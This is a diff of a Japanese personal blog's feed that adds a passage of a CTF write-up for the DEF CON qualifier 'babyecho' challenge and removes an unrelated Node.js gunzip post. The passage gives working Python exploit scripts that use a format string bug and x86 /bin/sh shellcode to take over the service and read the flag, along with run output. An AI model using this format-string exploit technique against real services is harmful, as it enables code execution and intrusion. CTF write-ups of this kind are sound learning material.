+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="s">&#39;localhost&#39;</span> <span class="c"># &#39;babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me&#39;</span>
+</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">3232</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+</span><span class='line'>    <span class="n">index</span> <span class="o">=</span> <span class="mi">7</span> <span class="c"># index of read/write buffer</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
+</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%5$10p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># request buffer address</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&quot;[DEBUG] Buffer address = 0x</span><span class="si">%x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">addr_buf</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">code</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">addr_buf</span> <span class="o">-</span> <span class="mh">0xb</span><span class="p">))</span> <span class="c"># address[buffer size limit] &lt;&lt; 8</span>
+</span><span class='line'>    <span class="n">code</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">$ln</span><span class="se">\n</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">index</span> <span class="c"># write message text length = 4</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="c"># overwrite buffer</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">exploit</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>実行してみると、以下のようになりました。</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">Reading</span> <span class="mi">13</span> <span class="nb">bytes</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Buffer</span> <span class="n">address</span> <span class="o">=</span> <span class="mh">0xffbf62bc</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Reading</span> <span class="mi">1023</span> <span class="nb">bytes</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>1度にバッファーに読み込み可能な文字数の上限が変化しました。esp+0x10の値は、esp+0x11に4を書き込んだことから、0x0000040d、すなわち1037になっていますが、ループを繰り返すたび値のチェックがあり、1023を超える場合は1023に描き戻されているので、上限が1023 bytesになりました。</p>
+
+<p>これだけあれば、shellcodeを送り込んで実行させることができます。サブルーチンコールの呼び出し元であるリターンアドレスを書き換え、shellcodeを実行させてフラッグを獲得しに行きます。</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="s">&#39;localhost&#39;</span> <span class="c"># &#39;babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me&#39;</span>
+</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">3232</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+</span><span class='line'>    <span class="n">index</span> <span class="o">=</span> <span class="mi">7</span> <span class="c"># index of read/write buffer</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
+</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%5$10p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># request buffer address</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&quot;[DEBUG] Buffer address = 0x</span><span class="si">%x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">addr_buf</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">code</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">addr_buf</span> <span class="o">-</span> <span class="mh">0xb</span><span class="p">))</span> <span class="c"># address[buffer size limit] &lt;&lt; 8</span>
+</span><span class='line'>    <span class="n">code</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">$ln</span><span class="se">\n</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">index</span> <span class="c"># write message text length = 4</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="c"># overwrite buffer</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># x86 /bin/sh shellcode</span>
+</span><span class='line'>    <span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">addr_ret</span> <span class="o">=</span> <span class="n">addr_buf</span> <span class="o">-</span> <span class="mh">0x20</span>  <span class="c"># call return address = [esp]</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">payload</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr_ret</span><span class="p">)</span> \
+</span><span class='line'>    <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr_ret</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> \
+</span><span class='line'>    <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr_ret</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> \
+</span><span class='line'>    <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr_ret</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> \
+</span><span class='line'>    <span class="o">+</span> <span class="n">shellcode</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">addr_shell</span> <span class="o">=</span> <span class="p">[</span>
+</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">&gt;&gt;</span> <span class="mi">0</span>  <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span>
+</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>  <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span>
+</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span>
+</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%%d</span><span class="s">$hhn&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr_shell</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span> \
+</span><span class='line'>    <span class="o">+</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%%d</span><span class="s">$hhn&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr_shell</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">addr_shell</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> \
+</span><span class='line'>    <span class="o">+</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%%d</span><span class="s">$hhn&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr_shell</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="n">addr_shell</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> \
+</span><span class='line'>    <span class="o">+</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%%d</span><span class="s">$hhn&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr_shell</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="n">addr_shell</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> \
+</span><span class='line'>    <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c"># exploit</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;cat&lt;/home/babyecho/flag</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># capture the flag</span>
+</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
+</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">exploit</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>実行結果は以下のとおりです。</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">Reading</span> <span class="mi">13</span> <span class="nb">bytes</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Buffer</span> <span class="n">address</span> <span class="o">=</span> <span class="mh">0xffbf62bc</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Reading</span> <span class="mi">1023</span> <span class="nb">bytes</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">彙ｿ…拊ｿ…枌ｿ…歟ｿ…</span><span class="n">j</span><span class="n">X</span><span class="err">儚</span><span class="n">h</span><span class="o">//</span><span class="n">shh</span><span class="o">/</span><span class="nb">bin</span><span class="err">峨</span><span class="mi">1</span><span class="err">ﾉﾍ</span>\                                                                                                                                                                      <span class="err">…</span>
+</span><span class='line'>                                                                                            <span class="err"></span>                                                               <span class="err">…</span>
+</span><span class='line'><span class="n">The</span> <span class="n">flag</span> <span class="ow">is</span><span class="p">:</span> <span class="mi">1</span><span class="n">s</span> <span class="mi">1</span><span class="n">s</span> <span class="n">th3r3</span> <span class="n">th3r3</span> <span class="nd">@n</span> <span class="nd">@n</span> <span class="mi">3</span><span class="n">ch0</span> <span class="mi">3</span><span class="n">ch0</span> <span class="mi">1</span><span class="n">n</span> <span class="mi">1</span><span class="n">n</span> <span class="n">h3r3</span> <span class="n">h3r3</span><span class="err">?</span> <span class="mi">3</span><span class="n">uoiw</span><span class="err">!</span><span class="n">T0</span><span class="o">*%</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>FLAG:<code>1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%
+</code></p>
+
+<h1>その他</h1>
+
+<p>Codingchallengeという、とあるレジスタの初期状態と機械語の命令コードが送られてきて、その命令を実行した結果を送り返すという問題も解いたのですが、違う問題でglibcのアップデートをした際にマシンがクラッシュし、スナップショットの状態に戻した際に消えてしまいました。
+なのでコードがありません。</p>
+
+<p>解法としては、Pythonで以下のように処理するものを作成して実行しただけです。</p>
+
+<ol>
+<li>レジスタの初期状態と機械語命令コードを受信＆パースする</li>
+<li>Cのソースコードを生成
+
+<ol>
+<li>命令コードをunsigned char型配列に突っ込む</li>
+<li>その配列を関数ポインタに変換</li>
+<li>mprotectで配列の領域を実行可能に変更</li>
+<li>asm volatile経由でレジスタの初期状態を書き込む</li>
+<li>関数ポインタを呼び出し実行</li>
+<li>ams volatile経由で実行後のレジスタの値を読み出す</li>
+<li>標準出力に出力</li>
+</ol>
+</li>
+<li>gccでソースコードをコンパイル</li>
+<li>生成したバイナリを実行し、出力を得る</li>
+<li>出力を送信</li>
+</ol>
+
+
+<p>となっています。
+途中、mprotectに関してみむらさんからアドバイスをいただき、解くことができました。</p>
+
+<p><a href="http://mimumimu.net/blog/2011/11/17/c%E3%82%B3%E3%83%BC%E3%83%89%E4%B8%AD%E3%81%AB%E3%83%9E%E3%82%B7%E3%83%B3%E8%AA%9E%E3%82%92%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%93%E3%81%A7%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B%E3%80%82/">Cコード中にマシン語を埋め込んで実行する。 | みむらの手記手帳</a></p>
+
+<p>FLAG: <code>Cats with frickin lazer beamz on top of their heads!</code></p>
+
+<h1>まとめ</h1>
+
+<p>チーム全体で計19ポイントを獲得し、結果33位でした。1ポイントしか貢献できませんでしたが、大人数でお互い協力して問題を解く楽しさを味わえてとても有意義でした。
+また、問題傾向がPwn寄りであることから、もっとPwnに関する実力をつけなければならないと再確認できた良い機会でした。
+来年は5ポイントを目標に挑みたいと思います！</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[えびの水槽引越しと環境整備と飼育について]]></title>
@@ -4848,41 +5643,6 @@ Z87チップセットはDDR3-1333/1600対応のため、たくさんの仮想マ
 
 <p>計62,279円で、このサーバーを構築できました。目標としていた8万円を大きく下回り、金銭的にストレージ増設の余地があります。
 このサーバーを生かして、今後いろいろと実験していくような記事を書く予定ですので、こう御期待。</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Node.jsでダウンロードしながらGunzipしてmd5の計算しながら保存する奴]]></title>
-    <link href="http://mzyy94.com/blog/2014/02/25/dl-gunzip-with-nodejs/"/>
-    <updated>2014-02-25T22:18:21+09:00</updated>
-    <id>http://mzyy94.com/blog/2014/02/25/dl-gunzip-with-nodejs</id>
-    <content type="html"><![CDATA[<p><a href="http://nodejs.org/">Node.js</a>です。
-Lempel-Ziv符号化で圧縮されたファイル(.gz)のダウンロードをしようとしたときの話です。
-ブラウザからダウンロードすると、拡張子gzで保存され、それを解凍することで必要なデータを得ることができるのですが、圧縮されたファイルは解凍したあとでは不要です。
-このような不要ファイルを保存することなく、目的のファイルが欲しいような状況になったので、いろいろと調べて解決しました。</p>
-
-<!-- more -->
-
-
-<p>Lempel-Ziv符号化で圧縮されたファイルは、かの有名な<a href="http://www.zlib.net/">zlib</a>によって扱うことができます。
-Node.jsの標準モジュールには、zlibがあり、require()で取り込むことでzlibを利用することができます。
-標準モジュールであるため、APIに関する説明が<a href="http://nodejs.org/api/zlib.html">Node.js公式ドキュメント</a>にあるのですが、よく使い方がわからなかったので、いろいろと試行錯誤してみました。</p>
-
-<p>結果、zlibモジュールを利用してストリームを扱うオブジェクトを作成し、パイプでつなげることで、前途の目的である、圧縮されたアーカイブファイルを保存することなく、目的のファイルを保存することができました。</p>
-
-<p>以下、ソースコードになります。
-引数に拡張子gzのファイルのURLを渡し実行することで、解凍されたファイルを保存できます。</p>
-
-<script src="https://gist.github.com/mzyy94/9209459.js"></script>
-
-
-<p>20行目の<code>res.pipe(gunzip).pipe(output);</code>にてhttp.getで得られたストリームを<code>zlib.createGunzip()</code>で作成したgunzipオブジェクトにパイプで渡し、処理されたものを、<code>fs.createWriteStream()</code>で作成されたoutputオブジェクトにさらにパイプすることで不要なファイルを保存することなく、ダウンロードしながら解凍し、保存しています。</p>
-
-<p>保存時に、gunzipオブジェクトの&#8217;data&#8217;イベントを拾って、crypto標準モジュールでmd5の値を計算させています。
-ダウンロードのときはmd5チェックしたいですし。</p>
-
-<p>Node.jsのzlibモジュールに関して、あまり実例がなく、せっかくなので記事にしました。
-ご参考になれば幸いです。</p>
 ]]></content>
   </entry>
   
